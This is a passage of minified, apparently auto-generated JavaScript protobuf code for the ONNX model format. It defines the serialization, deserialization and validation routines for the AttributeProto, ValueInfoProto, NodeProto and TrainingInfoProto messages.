i=0;i<message.floats.length;++i)writer.float(message.floats[i]);writer.ldelim()}if(null!=message.ints&&message.ints.length){for(writer.uint32(66).fork(),i=0;i<message.ints.length;++i)writer.int64(message.ints[i]);writer.ldelim()}if(null!=message.strings&&message.strings.length)for(i=0;i<message.strings.length;++i)writer.uint32(74).bytes(message.strings[i]);if(null!=message.tensors&&message.tensors.length)for(i=0;i<message.tensors.length;++i)$root.onnx.TensorProto.encode(message.tensors[i],writer.uint32(82).fork()).ldelim();if(null!=message.graphs&&message.graphs.length)for(i=0;i<message.graphs.length;++i)$root.onnx.GraphProto.encode(message.graphs[i],writer.uint32(90).fork()).ldelim();if(null!=message.docString&&Object.hasOwnProperty.call(message,"docString")&&writer.uint32(106).string(message.docString),null!=message.tp&&Object.hasOwnProperty.call(message,"tp")&&$root.onnx.TypeProto.encode(message.tp,writer.uint32(114).fork()).ldelim(),null!=message.typeProtos&&message.typeProtos.length)for(i=0;i<message.typeProtos.length;++i)$root.onnx.TypeProto.encode(message.typeProtos[i],writer.uint32(122).fork()).ldelim();if(null!=message.type&&Object.hasOwnProperty.call(message,"type")&&writer.uint32(160).int32(message.type),null!=message.refAttrName&&Object.hasOwnProperty.call(message,"refAttrName")&&writer.uint32(170).string(message.refAttrName),null!=message.sparseTensor&&Object.hasOwnProperty.call(message,"sparseTensor")&&$root.onnx.SparseTensorProto.encode(message.sparseTensor,writer.uint32(178).fork()).ldelim(),null!=message.sparseTensors&&message.sparseTensors.length)for(i=0;i<message.sparseTensors.length;++i)$root.onnx.SparseTensorProto.encode(message.sparseTensors[i],writer.uint32(186).fork()).ldelim();return writer},AttributeProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},AttributeProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.AttributeProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.name=reader.string();break;case 21:message.refAttrName=reader.string();break;case 13:message.docString=reader.string();break;case 20:message.type=reader.int32();break;case 2:message.f=reader.float();break;case 3:message.i=reader.int64();break;case 4:message.s=reader.bytes();break;case 5:message.t=$root.onnx.TensorProto.decode(reader,reader.uint32());break;case 6:message.g=$root.onnx.GraphProto.decode(reader,reader.uint32());break;case 22:message.sparseTensor=$root.onnx.SparseTensorProto.decode(reader,reader.uint32());break;case 14:message.tp=$root.onnx.TypeProto.decode(reader,reader.uint32());break;case 7:if(message.floats&&message.floats.length||(message.floats=[]),2==(7&tag))for(var end2=reader.uint32()+reader.pos;reader.pos<end2;)message.floats.push(reader.float());else message.floats.push(reader.float());break;case 8:if(message.ints&&message.ints.length||(message.ints=[]),2==(7&tag))for(end2=reader.uint32()+reader.pos;reader.pos<end2;)message.ints.push(reader.int64());else message.ints.push(reader.int64());break;case 9:message.strings&&message.strings.length||(message.strings=[]),message.strings.push(reader.bytes());break;case 10:message.tensors&&message.tensors.length||(message.tensors=[]),message.tensors.push($root.onnx.TensorProto.decode(reader,reader.uint32()));break;case 11:message.graphs&&message.graphs.length||(message.graphs=[]),message.graphs.push($root.onnx.GraphProto.decode(reader,reader.uint32()));break;case 23:message.sparseTensors&&message.sparseTensors.length||(message.sparseTensors=[]),message.sparseTensors.push($root.onnx.SparseTensorProto.decode(reader,reader.uint32()));break;case 15:message.typeProtos&&message.typeProtos.length||(message.typeProtos=[]),message.typeProtos.push($root.onnx.TypeProto.decode(reader,reader.uint32()));break;default:reader.skipType(7&tag)}}return message},AttributeProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},AttributeProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.name&&message.hasOwnProperty("name")&&!$util.isString(message.name))return"name: string expected";if(null!=message.refAttrName&&message.hasOwnProperty("refAttrName")&&!$util.isString(message.refAttrName))return"refAttrName: string expected";if(null!=message.docString&&message.hasOwnProperty("docString")&&!$util.isString(message.docString))return"docString: string expected";if(null!=message.type&&message.hasOwnProperty("type"))switch(message.type){default:return"type: enum value expected";case 0:case 1:case 2:case 3:case 4:case 5:case 11:case 13:case 6:case 7:case 8:case 9:case 10:case 12:case 14:}if(null!=message.f&&message.hasOwnProperty("f")&&"number"!=typeof message.f)return"f: number expected";if(null!=message.i&&message.hasOwnProperty("i")&&!($util.isInteger(message.i)||message.i&&$util.isInteger(message.i.low)&&$util.isInteger(message.i.high)))return"i: integer|Long expected";if(null!=message.s&&message.hasOwnProperty("s")&&!(message.s&&"number"==typeof message.s.length||$util.isString(message.s)))return"s: buffer expected";if(null!=message.t&&message.hasOwnProperty("t")&&(error=$root.onnx.TensorProto.verify(message.t)))return"t."+error;if(null!=message.g&&message.hasOwnProperty("g")&&(error=$root.onnx.GraphProto.verify(message.g)))return"g."+error;if(null!=message.sparseTensor&&message.hasOwnProperty("sparseTensor")&&(error=$root.onnx.SparseTensorProto.verify(message.sparseTensor)))return"sparseTensor."+error;if(null!=message.tp&&message.hasOwnProperty("tp")&&(error=$root.onnx.TypeProto.verify(message.tp)))return"tp."+error;if(null!=message.floats&&message.hasOwnProperty("floats")){if(!Array.isArray(message.floats))return"floats: array expected";for(var i=0;i<message.floats.length;++i)if("number"!=typeof message.floats[i])return"floats: number[] expected"}if(null!=message.ints&&message.hasOwnProperty("ints")){if(!Array.isArray(message.ints))return"ints: array expected";for(i=0;i<message.ints.length;++i)if(!($util.isInteger(message.ints[i])||message.ints[i]&&$util.isInteger(message.ints[i].low)&&$util.isInteger(message.ints[i].high)))return"ints: integer|Long[] expected"}if(null!=message.strings&&message.hasOwnProperty("strings")){if(!Array.isArray(message.strings))return"strings: array expected";for(i=0;i<message.strings.length;++i)if(!(message.strings[i]&&"number"==typeof message.strings[i].length||$util.isString(message.strings[i])))return"strings: buffer[] expected"}if(null!=message.tensors&&message.hasOwnProperty("tensors")){if(!Array.isArray(message.tensors))return"tensors: array expected";for(i=0;i<message.tensors.length;++i)if(error=$root.onnx.TensorProto.verify(message.tensors[i]))return"tensors."+error}if(null!=message.graphs&&message.hasOwnProperty("graphs")){if(!Array.isArray(message.graphs))return"graphs: array expected";for(i=0;i<message.graphs.length;++i)if(error=$root.onnx.GraphProto.verify(message.graphs[i]))return"graphs."+error}if(null!=message.sparseTensors&&message.hasOwnProperty("sparseTensors")){if(!Array.isArray(message.sparseTensors))return"sparseTensors: array expected";for(i=0;i<message.sparseTensors.length;++i)if(error=$root.onnx.SparseTensorProto.verify(message.sparseTensors[i]))return"sparseTensors."+error}if(null!=message.typeProtos&&message.hasOwnProperty("typeProtos")){if(!Array.isArray(message.typeProtos))return"typeProtos: array expected";for(i=0;i<message.typeProtos.length;++i){var error;if(error=$root.onnx.TypeProto.verify(message.typeProtos[i]))return"typeProtos."+error}}return null},AttributeProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.AttributeProto)return object;var message=new $root.onnx.AttributeProto;switch(null!=object.name&&(message.name=String(object.name)),null!=object.refAttrName&&(message.refAttrName=String(object.refAttrName)),null!=object.docString&&(message.docString=String(object.docString)),object.type){default:if("number"==typeof object.type){message.type=object.type;break}break;case"UNDEFINED":case 0:message.type=0;break;case"FLOAT":case 1:message.type=1;break;case"INT":case 2:message.type=2;break;case"STRING":case 3:message.type=3;break;case"TENSOR":case 4:message.type=4;break;case"GRAPH":case 5:message.type=5;break;case"SPARSE_TENSOR":case 11:message.type=11;break;case"TYPE_PROTO":case 13:message.type=13;break;case"FLOATS":case 6:message.type=6;break;case"INTS":case 7:message.type=7;break;case"STRINGS":case 8:message.type=8;break;case"TENSORS":case 9:message.type=9;break;case"GRAPHS":case 10:message.type=10;break;case"SPARSE_TENSORS":case 12:message.type=12;break;case"TYPE_PROTOS":case 14:message.type=14}if(null!=object.f&&(message.f=Number(object.f)),null!=object.i&&($util.Long?(message.i=$util.Long.fromValue(object.i)).unsigned=!1:"string"==typeof object.i?message.i=parseInt(object.i,10):"number"==typeof object.i?message.i=object.i:"object"==typeof object.i&&(message.i=new $util.LongBits(object.i.low>>>0,object.i.high>>>0).toNumber())),null!=object.s&&("string"==typeof object.s?$util.base64.decode(object.s,message.s=$util.newBuffer($util.base64.length(object.s)),0):object.s.length>=0&&(message.s=object.s)),null!=object.t){if("object"!=typeof object.t)throw TypeError(".onnx.AttributeProto.t: object expected");message.t=$root.onnx.TensorProto.fromObject(object.t)}if(null!=object.g){if("object"!=typeof object.g)throw TypeError(".onnx.AttributeProto.g: object expected");message.g=$root.onnx.GraphProto.fromObject(object.g)}if(null!=object.sparseTensor){if("object"!=typeof object.sparseTensor)throw TypeError(".onnx.AttributeProto.sparseTensor: object expected");message.sparseTensor=$root.onnx.SparseTensorProto.fromObject(object.sparseTensor)}if(null!=object.tp){if("object"!=typeof object.tp)throw TypeError(".onnx.AttributeProto.tp: object expected");message.tp=$root.onnx.TypeProto.fromObject(object.tp)}if(object.floats){if(!Array.isArray(object.floats))throw TypeError(".onnx.AttributeProto.floats: array expected");message.floats=[];for(var i=0;i<object.floats.length;++i)message.floats[i]=Number(object.floats[i])}if(object.ints){if(!Array.isArray(object.ints))throw TypeError(".onnx.AttributeProto.ints: array expected");for(message.ints=[],i=0;i<object.ints.length;++i)$util.Long?(message.ints[i]=$util.Long.fromValue(object.ints[i])).unsigned=!1:"string"==typeof object.ints[i]?message.ints[i]=parseInt(object.ints[i],10):"number"==typeof object.ints[i]?message.ints[i]=object.ints[i]:"object"==typeof object.ints[i]&&(message.ints[i]=new $util.LongBits(object.ints[i].low>>>0,object.ints[i].high>>>0).toNumber())}if(object.strings){if(!Array.isArray(object.strings))throw TypeError(".onnx.AttributeProto.strings: array expected");for(message.strings=[],i=0;i<object.strings.length;++i)"string"==typeof object.strings[i]?$util.base64.decode(object.strings[i],message.strings[i]=$util.newBuffer($util.base64.length(object.strings[i])),0):object.strings[i].length>=0&&(message.strings[i]=object.strings[i])}if(object.tensors){if(!Array.isArray(object.tensors))throw TypeError(".onnx.AttributeProto.tensors: array expected");for(message.tensors=[],i=0;i<object.tensors.length;++i){if("object"!=typeof object.tensors[i])throw TypeError(".onnx.AttributeProto.tensors: object expected");message.tensors[i]=$root.onnx.TensorProto.fromObject(object.tensors[i])}}if(object.graphs){if(!Array.isArray(object.graphs))throw TypeError(".onnx.AttributeProto.graphs: array expected");for(message.graphs=[],i=0;i<object.graphs.length;++i){if("object"!=typeof object.graphs[i])throw TypeError(".onnx.AttributeProto.graphs: object expected");message.graphs[i]=$root.onnx.GraphProto.fromObject(object.graphs[i])}}if(object.sparseTensors){if(!Array.isArray(object.sparseTensors))throw TypeError(".onnx.AttributeProto.sparseTensors: array expected");for(message.sparseTensors=[],i=0;i<object.sparseTensors.length;++i){if("object"!=typeof object.sparseTensors[i])throw TypeError(".onnx.AttributeProto.sparseTensors: object expected");message.sparseTensors[i]=$root.onnx.SparseTensorProto.fromObject(object.sparseTensors[i])}}if(object.typeProtos){if(!Array.isArray(object.typeProtos))throw TypeError(".onnx.AttributeProto.typeProtos: array expected");for(message.typeProtos=[],i=0;i<object.typeProtos.length;++i){if("object"!=typeof object.typeProtos[i])throw TypeError(".onnx.AttributeProto.typeProtos: object expected");message.typeProtos[i]=$root.onnx.TypeProto.fromObject(object.typeProtos[i])}}return message},AttributeProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.floats=[],object.ints=[],object.strings=[],object.tensors=[],object.graphs=[],object.typeProtos=[],object.sparseTensors=[]),options.defaults){if(object.name="",object.f=0,$util.Long){var long=new $util.Long(0,0,!1);object.i=options.longs===String?long.toString():options.longs===Number?long.toNumber():long}else object.i=options.longs===String?"0":0;options.bytes===String?object.s="":(object.s=[],options.bytes!==Array&&(object.s=$util.newBuffer(object.s))),object.t=null,object.g=null,object.docString="",object.tp=null,object.type=options.enums===String?"UNDEFINED":0,object.refAttrName="",object.sparseTensor=null}if(null!=message.name&&message.hasOwnProperty("name")&&(object.name=message.name),null!=message.f&&message.hasOwnProperty("f")&&(object.f=options.json&&!isFinite(message.f)?String(message.f):message.f),null!=message.i&&message.hasOwnProperty("i")&&("number"==typeof message.i?object.i=options.longs===String?String(message.i):message.i:object.i=options.longs===String?$util.Long.prototype.toString.call(message.i):options.longs===Number?new $util.LongBits(message.i.low>>>0,message.i.high>>>0).toNumber():message.i),null!=message.s&&message.hasOwnProperty("s")&&(object.s=options.bytes===String?$util.base64.encode(message.s,0,message.s.length):options.bytes===Array?Array.prototype.slice.call(message.s):message.s),null!=message.t&&message.hasOwnProperty("t")&&(object.t=$root.onnx.TensorProto.toObject(message.t,options)),null!=message.g&&message.hasOwnProperty("g")&&(object.g=$root.onnx.GraphProto.toObject(message.g,options)),message.floats&&message.floats.length){object.floats=[];for(var j=0;j<message.floats.length;++j)object.floats[j]=options.json&&!isFinite(message.floats[j])?String(message.floats[j]):message.floats[j]}if(message.ints&&message.ints.length)for(object.ints=[],j=0;j<message.ints.length;++j)"number"==typeof message.ints[j]?object.ints[j]=options.longs===String?String(message.ints[j]):message.ints[j]:object.ints[j]=options.longs===String?$util.Long.prototype.toString.call(message.ints[j]):options.longs===Number?new $util.LongBits(message.ints[j].low>>>0,message.ints[j].high>>>0).toNumber():message.ints[j];if(message.strings&&message.strings.length)for(object.strings=[],j=0;j<message.strings.length;++j)object.strings[j]=options.bytes===String?$util.base64.encode(message.strings[j],0,message.strings[j].length):options.bytes===Array?Array.prototype.slice.call(message.strings[j]):message.strings[j];if(message.tensors&&message.tensors.length)for(object.tensors=[],j=0;j<message.tensors.length;++j)object.tensors[j]=$root.onnx.TensorProto.toObject(message.tensors[j],options);if(message.graphs&&message.graphs.length)for(object.graphs=[],j=0;j<message.graphs.length;++j)object.graphs[j]=$root.onnx.GraphProto.toObject(message.graphs[j],options);if(null!=message.docString&&message.hasOwnProperty("docString")&&(object.docString=message.docString),null!=message.tp&&message.hasOwnProperty("tp")&&(object.tp=$root.onnx.TypeProto.toObject(message.tp,options)),message.typeProtos&&message.typeProtos.length)for(object.typeProtos=[],j=0;j<message.typeProtos.length;++j)object.typeProtos[j]=$root.onnx.TypeProto.toObject(message.typeProtos[j],options);if(null!=message.type&&message.hasOwnProperty("type")&&(object.type=options.enums===String?void 0===$root.onnx.AttributeProto.AttributeType[message.type]?message.type:$root.onnx.AttributeProto.AttributeType[message.type]:message.type),null!=message.refAttrName&&message.hasOwnProperty("refAttrName")&&(object.refAttrName=message.refAttrName),null!=message.sparseTensor&&message.hasOwnProperty("sparseTensor")&&(object.sparseTensor=$root.onnx.SparseTensorProto.toObject(message.sparseTensor,options)),message.sparseTensors&&message.sparseTensors.length)for(object.sparseTensors=[],j=0;j<message.sparseTensors.length;++j)object.sparseTensors[j]=$root.onnx.SparseTensorProto.toObject(message.sparseTensors[j],options);return object},AttributeProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},AttributeProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.AttributeProto"},AttributeProto.AttributeType=function(){var valuesById={},values=Object.create(valuesById);return values[valuesById[0]="UNDEFINED"]=0,values[valuesById[1]="FLOAT"]=1,values[valuesById[2]="INT"]=2,values[valuesById[3]="STRING"]=3,values[valuesById[4]="TENSOR"]=4,values[valuesById[5]="GRAPH"]=5,values[valuesById[11]="SPARSE_TENSOR"]=11,values[valuesById[13]="TYPE_PROTO"]=13,values[valuesById[6]="FLOATS"]=6,values[valuesById[7]="INTS"]=7,values[valuesById[8]="STRINGS"]=8,values[valuesById[9]="TENSORS"]=9,values[valuesById[10]="GRAPHS"]=10,values[valuesById[12]="SPARSE_TENSORS"]=12,values[valuesById[14]="TYPE_PROTOS"]=14,values}(),AttributeProto}(),onnx.ValueInfoProto=function(){function ValueInfoProto(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return ValueInfoProto.prototype.name="",ValueInfoProto.prototype.type=null,ValueInfoProto.prototype.docString="",ValueInfoProto.create=function create(properties){return new ValueInfoProto(properties)},ValueInfoProto.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.name&&Object.hasOwnProperty.call(message,"name")&&writer.uint32(10).string(message.name),null!=message.type&&Object.hasOwnProperty.call(message,"type")&&$root.onnx.TypeProto.encode(message.type,writer.uint32(18).fork()).ldelim(),null!=message.docString&&Object.hasOwnProperty.call(message,"docString")&&writer.uint32(26).string(message.docString),writer},ValueInfoProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},ValueInfoProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.ValueInfoProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.name=reader.string();break;case 2:message.type=$root.onnx.TypeProto.decode(reader,reader.uint32());break;case 3:message.docString=reader.string();break;default:reader.skipType(7&tag)}}return message},ValueInfoProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},ValueInfoProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.name&&message.hasOwnProperty("name")&&!$util.isString(message.name))return"name: string expected";if(null!=message.type&&message.hasOwnProperty("type")){var error=$root.onnx.TypeProto.verify(message.type);if(error)return"type."+error}return null!=message.docString&&message.hasOwnProperty("docString")&&!$util.isString(message.docString)?"docString: string expected":null},ValueInfoProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.ValueInfoProto)return object;var message=new $root.onnx.ValueInfoProto;if(null!=object.name&&(message.name=String(object.name)),null!=object.type){if("object"!=typeof object.type)throw TypeError(".onnx.ValueInfoProto.type: object expected");message.type=$root.onnx.TypeProto.fromObject(object.type)}return null!=object.docString&&(message.docString=String(object.docString)),message},ValueInfoProto.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.name="",object.type=null,object.docString=""),null!=message.name&&message.hasOwnProperty("name")&&(object.name=message.name),null!=message.type&&message.hasOwnProperty("type")&&(object.type=$root.onnx.TypeProto.toObject(message.type,options)),null!=message.docString&&message.hasOwnProperty("docString")&&(object.docString=message.docString),object},ValueInfoProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},ValueInfoProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.ValueInfoProto"},ValueInfoProto}(),onnx.NodeProto=function(){function NodeProto(properties){if(this.input=[],this.output=[],this.attribute=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return NodeProto.prototype.input=$util.emptyArray,NodeProto.prototype.output=$util.emptyArray,NodeProto.prototype.name="",NodeProto.prototype.opType="",NodeProto.prototype.domain="",NodeProto.prototype.attribute=$util.emptyArray,NodeProto.prototype.docString="",NodeProto.create=function create(properties){return new NodeProto(properties)},NodeProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.input&&message.input.length)for(var i=0;i<message.input.length;++i)writer.uint32(10).string(message.input[i]);if(null!=message.output&&message.output.length)for(i=0;i<message.output.length;++i)writer.uint32(18).string(message.output[i]);if(null!=message.name&&Object.hasOwnProperty.call(message,"name")&&writer.uint32(26).string(message.name),null!=message.opType&&Object.hasOwnProperty.call(message,"opType")&&writer.uint32(34).string(message.opType),null!=message.attribute&&message.attribute.length)for(i=0;i<message.attribute.length;++i)$root.onnx.AttributeProto.encode(message.attribute[i],writer.uint32(42).fork()).ldelim();return null!=message.docString&&Object.hasOwnProperty.call(message,"docString")&&writer.uint32(50).string(message.docString),null!=message.domain&&Object.hasOwnProperty.call(message,"domain")&&writer.uint32(58).string(message.domain),writer},NodeProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},NodeProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.NodeProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.input&&message.input.length||(message.input=[]),message.input.push(reader.string());break;case 2:message.output&&message.output.length||(message.output=[]),message.output.push(reader.string());break;case 3:message.name=reader.string();break;case 4:message.opType=reader.string();break;case 7:message.domain=reader.string();break;case 5:message.attribute&&message.attribute.length||(message.attribute=[]),message.attribute.push($root.onnx.AttributeProto.decode(reader,reader.uint32()));break;case 6:message.docString=reader.string();break;default:reader.skipType(7&tag)}}return message},NodeProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},NodeProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.input&&message.hasOwnProperty("input")){if(!Array.isArray(message.input))return"input: array expected";for(var i=0;i<message.input.length;++i)if(!$util.isString(message.input[i]))return"input: string[] expected"}if(null!=message.output&&message.hasOwnProperty("output")){if(!Array.isArray(message.output))return"output: array expected";for(i=0;i<message.output.length;++i)if(!$util.isString(message.output[i]))return"output: string[] expected"}if(null!=message.name&&message.hasOwnProperty("name")&&!$util.isString(message.name))return"name: string expected";if(null!=message.opType&&message.hasOwnProperty("opType")&&!$util.isString(message.opType))return"opType: string expected";if(null!=message.domain&&message.hasOwnProperty("domain")&&!$util.isString(message.domain))return"domain: string expected";if(null!=message.attribute&&message.hasOwnProperty("attribute")){if(!Array.isArray(message.attribute))return"attribute: array expected";for(i=0;i<message.attribute.length;++i){var error=$root.onnx.AttributeProto.verify(message.attribute[i]);if(error)return"attribute."+error}}return null!=message.docString&&message.hasOwnProperty("docString")&&!$util.isString(message.docString)?"docString: string expected":null},NodeProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.NodeProto)return object;var message=new $root.onnx.NodeProto;if(object.input){if(!Array.isArray(object.input))throw TypeError(".onnx.NodeProto.input: array expected");message.input=[];for(var i=0;i<object.input.length;++i)message.input[i]=String(object.input[i])}if(object.output){if(!Array.isArray(object.output))throw TypeError(".onnx.NodeProto.output: array expected");for(message.output=[],i=0;i<object.output.length;++i)message.output[i]=String(object.output[i])}if(null!=object.name&&(message.name=String(object.name)),null!=object.opType&&(message.opType=String(object.opType)),null!=object.domain&&(message.domain=String(object.domain)),object.attribute){if(!Array.isArray(object.attribute))throw TypeError(".onnx.NodeProto.attribute: array expected");for(message.attribute=[],i=0;i<object.attribute.length;++i){if("object"!=typeof object.attribute[i])throw TypeError(".onnx.NodeProto.attribute: object expected");message.attribute[i]=$root.onnx.AttributeProto.fromObject(object.attribute[i])}}return null!=object.docString&&(message.docString=String(object.docString)),message},NodeProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.input=[],object.output=[],object.attribute=[]),options.defaults&&(object.name="",object.opType="",object.docString="",object.domain=""),message.input&&message.input.length){object.input=[];for(var j=0;j<message.input.length;++j)object.input[j]=message.input[j]}if(message.output&&message.output.length)for(object.output=[],j=0;j<message.output.length;++j)object.output[j]=message.output[j];if(null!=message.name&&message.hasOwnProperty("name")&&(object.name=message.name),null!=message.opType&&message.hasOwnProperty("opType")&&(object.opType=message.opType),message.attribute&&message.attribute.length)for(object.attribute=[],j=0;j<message.attribute.length;++j)object.attribute[j]=$root.onnx.AttributeProto.toObject(message.attribute[j],options);return null!=message.docString&&message.hasOwnProperty("docString")&&(object.docString=message.docString),null!=message.domain&&message.hasOwnProperty("domain")&&(object.domain=message.domain),object},NodeProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},NodeProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.NodeProto"},NodeProto}(),onnx.TrainingInfoProto=function(){function TrainingInfoProto(properties){if(this.initializationBinding=[],this.updateBinding=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return TrainingInfoProto.prototype.initialization=null,TrainingInfoProto.prototype.algorithm=null,TrainingInfoProto.prototype.initializationBinding=$util.emptyArray,TrainingInfoProto.prototype.updateBinding=$util.emptyArray,TrainingInfoProto.create=function create(properties){return new TrainingInfoProto(properties)},TrainingInfoProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.initialization&&Object.hasOwnProperty.call(message,"initialization")&&$root.onnx.GraphProto.encode(message.initialization,writer.uint32(10).fork()).ldelim(),null!=message.algorithm&&Object.hasOwnProperty.call(message,"algorithm")&&$root.onnx.GraphProto.encode(message.algorithm,writer.uint32(18).fork()).ldelim(),null!=message.initializationBinding&&message.initializationBinding.length)for(var i=0;i<message.initializationBinding.length;++i)$root.onnx.StringStringEntryProto.encode(message.initializationBinding[i],writer.uint32(26).fork()).ldelim();if(null!=message.updateBinding&&message.updateBinding.length)for(i=0;i<message.updateBinding.length;++i)$root.onnx.StringStringEntryProto.encode(message.updateBinding[i],writer.uint32(34).fork()).ldelim();return writer},TrainingInfoProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},TrainingInfoProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TrainingInfoProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.initialization=$root.onnx.GraphProto.decode(reader,reader.uint32());break;case 2:message.algorithm=$root.onnx.GraphProto.decode(reader,reader.uint32());break;case 3:message.initializationBinding&&message.initializationBinding.length||(message.initializationBinding=[]),message.initializationBinding.push($root.onnx.StringStringEntryProto.decode(reader,reader.uint32()));break;case 4:message.updateBinding&&message.updateBinding.length||(message.updateBinding=[]),message.updateBinding.push($root.onnx.StringStringEntryProto.decode(reader,reader.uint32()));break;default:reader.skipType(7&tag)}}return message},TrainingInfoProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},TrainingInfoProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.initialization&&message.hasOwnProperty("initialization")&&(error=$root.onnx.GraphProto.verify(message.initialization)))return"initialization."+error;if(null!=message.algorithm&&message.hasOwnProperty("algorithm")&&(error=$root.onnx.GraphProto.verify(message.algorithm)))return"algorithm."+error;if(null!=message.initializationBinding&&message.hasOwnProperty("initializationBinding")){if(!Array.isArray(message.initializationBinding))return"initializationBinding: array expected";for(var i=0;i<message.initializationBinding.length;++i)if(error=$root.onnx.StringStringEntryProto.verify(message.initializationBinding[i]))return"initializationBinding."+error}if(null!=message.updateBinding&&message.hasOwnProperty("updateBinding")){if(!Array.isArray(message.updateBinding))return"updateBinding: array expected";for(i=0;i<message.updateBinding.length;++i){var error;if(error=$root.onnx.StringStringEntryProto.verify(message.updateBinding[i]))return"updateBinding."+error}}return null},TrainingInfoProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.TrainingInfoProto)return object;var message=new $root.onnx.TrainingInfoProto;if(null!=object.initialization){if("object"!=typeof object.initialization)throw TypeError(".onnx.TrainingInfoProto.initialization: object expected");message.initialization=$root.onnx.GraphProto.fromObject(object.initialization)}if(null!=object.algorithm){if("object"!=typeof object.algorithm)throw TypeError(".onnx.TrainingInfoProto.algorithm: object expected");message.algorithm=$root.onnx.GraphProto.fromObject(object.algorithm)}if(object.initializationBinding){if(!Array.isArray(object.initializationBinding))throw TypeError(".onnx.TrainingInfoProto.initializationBinding: array expected");message.initializationBinding=[];for(var i=0;i<object.initializationBinding.length;++i){if("object"!=typeof object.initializationBinding[i])throw TypeError(".onnx.TrainingInfoProto.initializationBinding: object expected");message.initializationBinding[i]=$root.onnx.StringStringEntryProto.fromObject(object.initializationBinding[i])}}if(object.updateBinding){if(!Array.isArray(object.updateBinding))throw TypeError(".onnx.TrainingInfoProto.updateBinding: array expected");for(message.updateBinding=[],i=0;i<object.updateBinding.length;++i){if("object"!=typeof object.updateBinding[i])throw TypeError(".onnx.TrainingInfoProto.updateBinding: object expected");message.updateBinding[i]=$root.onnx.StringStringEntryProto.fromObject(object.updateBinding[i])}}return message},TrainingInfoProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.initializationBinding=[],object.updateBinding=[]),options.defaults&&(object.initialization=null,object.algorithm=null),null!=message.initialization&&message.hasOwnProperty("initialization")&&(object.initialization=$root.onnx.GraphProto.toObject(message.initialization,options)),null!=message.algorithm&&message.hasOwnProperty("algorithm")&&(object.algorithm=$root.onnx.GraphProto.toObject(message.algorithm,options)),message.initializationBinding&&message.initializationBinding.length){object.initializationBinding=[];for(var j=0;j<message.initializationBinding.length;++j)object.initializationBinding[j]=$root.onnx.StringStringEntryProto.toObject(message.initializationBinding[j],options)}if(message.updateBinding&&message.updateBinding.length)for(object.updateBinding=[],j=0;j<message.updateBinding.length;++j)object.updateBinding[j]=$root.onnx.StringStringEntryProto.toObject(message.updateBinding[j],options);return object},TrainingInfoProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},TrainingInfoProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TrainingInfoProto"},TrainingInfoProto}(),onnx.ModelProto=function(){function ModelProto(properties){if(this.opsetImport=[],this.metadataProps=[],this.trainingInfo=[],this.functions=[],properties)for(var 